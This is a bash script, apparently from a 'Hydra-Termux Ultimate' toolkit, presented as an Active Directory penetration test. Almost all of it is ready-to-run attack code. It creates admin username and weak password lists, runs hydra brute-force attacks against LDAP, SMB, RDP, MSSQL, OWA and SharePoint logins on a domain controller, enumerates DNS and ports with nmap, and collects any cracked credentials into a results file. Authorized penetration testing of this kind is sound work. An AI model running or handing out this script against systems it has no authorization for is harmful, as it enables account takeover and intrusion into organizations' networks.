#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# 🚀 SUPREME COMBO: ENTERPRISE ACTIVE DIRECTORY
# Complete AD penetration test
# LDAP + Kerberos + SMB + RDP + MSSQL + DNS + Web Services
# ═══════════════════════════════════════════════════════════════════

# ════════════════════════════════════════════════════════════════
# ⚡ CONFIGURATION - Replace with actual target ⚡
# ════════════════════════════════════════════════════════════════
DOMAIN_CONTROLLER="dc01.yourdomain.local"  # DC hostname/IP - REPLACE THIS
DOMAIN="YOURDOMAIN"                         # NetBIOS domain name - REPLACE THIS
FULL_DOMAIN="yourdomain.local"              # Full DNS domain - REPLACE THIS
# ════════════════════════════════════════════════════════════════

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUTPUT_DIR/combo_supreme_ad_${DOMAIN}_${TIMESTAMP}.log"
RESULTS_FILE="$OUTPUT_DIR/combo_supreme_ad_${DOMAIN}_${TIMESTAMP}_results.txt"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

clear
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  🚀 SUPREME COMBO: ENTERPRISE ACTIVE DIRECTORY PENTEST${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Domain Controller:${NC} ${BOLD}$DOMAIN_CONTROLLER${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Domain:${NC}            ${BOLD}$DOMAIN${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Full Domain:${NC}       ${BOLD}$FULL_DOMAIN${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Started:${NC}           $(date)" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# AD-specific usernames
USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

if [ ! -f "$USERLIST" ]; then
    cat > "$USERLIST" << EOF
administrator
admin
$DOMAIN\\administrator
$DOMAIN\\admin
domainadmin
sysadmin
sqlsvc
backup
helpdesk
EOF
fi

if [ ! -f "$PASSLIST" ]; then
    cat > "$PASSLIST" << EOF

Password123
Admin123
P@ssw0rd
Welcome123
Summer2024
Winter2024
$DOMAIN@123
Company123
changeme
letmein
EOF
fi

FOUND_CREDS=()

# ═══════════════════════════════════════════════════════════════════
# PHASE 1: LDAP ENUMERATION & AUTHENTICATION
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 1: LDAP Services ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# LDAP
echo -e "${BLUE}[1.1]${NC} Testing LDAP (Port 389)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 30 -f "ldap://$DOMAIN_CONTROLLER" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ LDAP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("LDAP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# LDAPS
echo -e "${BLUE}[1.2]${NC} Testing LDAPS (Port 636)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 35 -f "ldaps://$DOMAIN_CONTROLLER" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ LDAPS Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("LDAPS")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 2: SMB & FILE SHARES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 2: SMB/CIFS File Shares ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}[2.1]${NC} Testing SMB (Port 445)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -w 20 -f "smb://$DOMAIN_CONTROLLER" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ SMB Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("SMB")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 3: REMOTE DESKTOP SERVICES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 3: Remote Desktop Protocol ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}[3.1]${NC} Testing RDP (Port 3389)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 45 -f "rdp://$DOMAIN_CONTROLLER" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ RDP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("RDP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 4: MS SQL SERVER
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 4: Microsoft SQL Server ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}[4.1]${NC} Testing MSSQL (Port 1433)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 8 -w 30 -f "mssql://$DOMAIN_CONTROLLER" 2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ MSSQL Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("MSSQL")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 5: WEB SERVICES
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 5: Web Management Interfaces ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Outlook Web Access
echo -e "${BLUE}[5.1]${NC} Testing OWA/Exchange..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$DOMAIN_CONTROLLER/owa/auth.owa:username=^USER^&password=^PASS^:F=failed" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ OWA Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("OWA")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# SharePoint
echo -e "${BLUE}[5.2]${NC} Testing SharePoint..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$DOMAIN_CONTROLLER/_forms/default.aspx:username=^USER^&password=^PASS^:F=error" \
        2>&1 | tee -a "$LOG_FILE" || true
    if tail -20 "$LOG_FILE" | grep -q "login:"; then
        echo -e "   ${GREEN}✓ SharePoint Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("SharePoint")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 6: DNS ENUMERATION
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 6: DNS Enumeration ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if command -v nslookup &>/dev/null; then
    echo -e "${BLUE}[6.1]${NC} Enumerating DNS records..." | tee -a "$LOG_FILE"
    
    # Domain Controllers
    echo "   → Domain Controllers (SRV _ldap._tcp.$FULL_DOMAIN):" | tee -a "$LOG_FILE"
    nslookup -type=srv "_ldap._tcp.$FULL_DOMAIN" 2>/dev/null | grep "service" | tee -a "$LOG_FILE"
    
    # Kerberos
    echo "   → Kerberos (SRV _kerberos._tcp.$FULL_DOMAIN):" | tee -a "$LOG_FILE"
    nslookup -type=srv "_kerberos._tcp.$FULL_DOMAIN" 2>/dev/null | grep "service" | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 7: COMPREHENSIVE PORT SCAN
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 7: Service Discovery ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if command -v nmap &>/dev/null; then
    echo -e "${BLUE}[7.1]${NC} Scanning AD services..." | tee -a "$LOG_FILE"
    nmap -Pn -sV -p 53,88,135,139,389,445,464,636,1433,3268,3269,3389,5985,5986 -T4 "$DOMAIN_CONTROLLER" 2>&1 | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  ✅ ACTIVE DIRECTORY PENTEST COMPLETE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if [ ${#FOUND_CREDS[@]} -gt 0 ]; then
    echo -e "${GREEN}🎉 CREDENTIALS DISCOVERED:${NC}" | tee -a "$RESULTS_FILE"
    for service in "${FOUND_CREDS[@]}"; do
        echo -e "   ${GREEN}✓${NC} $service" | tee -a "$RESULTS_FILE"
    done
    echo "" | tee -a "$RESULTS_FILE"
    
    echo -e "${RED}⚠️  CRITICAL: Domain credentials compromised!${NC}" | tee -a "$RESULTS_FILE"
    echo -e "${YELLOW}   Immediate actions required:${NC}" | tee -a "$RESULTS_FILE"
    echo -e "   1. Reset all compromised passwords" | tee -a "$RESULTS_FILE"
    echo -e "   2. Enable Multi-Factor Authentication" | tee -a "$RESULTS_FILE"
    echo -e "   3. Review Account Lockout Policies" | tee -a "$RESULTS_FILE"
    echo -e "   4. Implement Privileged Access Workstations" | tee -a "$RESULTS_FILE"
    echo "" | tee -a "$RESULTS_FILE"
    
    grep -E "login:|password:|host:" "$LOG_FILE" | sort -u | tee -a "$RESULTS_FILE"
else
    echo -e "${YELLOW}ℹ No credentials found.${NC}" | tee -a "$RESULTS_FILE"
fi

echo "" | tee -a "$LOG_FILE"
echo -e "${BLUE}📊 Attack Summary:${NC}" | tee -a "$LOG_FILE"
echo -e "   Domain: $FULL_DOMAIN" | tee -a "$LOG_FILE"
echo -e "   Services Tested: LDAP, SMB, RDP, MSSQL, OWA, SharePoint" | tee -a "$LOG_FILE"
echo -e "   Successful: ${#FOUND_CREDS[@]}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}📁 Output Files:${NC}" | tee -a "$LOG_FILE"
echo -e "   Log: $LOG_FILE" | tee -a "$LOG_FILE"
echo -e "   Results: $RESULTS_FILE" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${PURPLE}⚡ AD PENTEST POWERED BY HYDRA-TERMUX ULTIMATE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
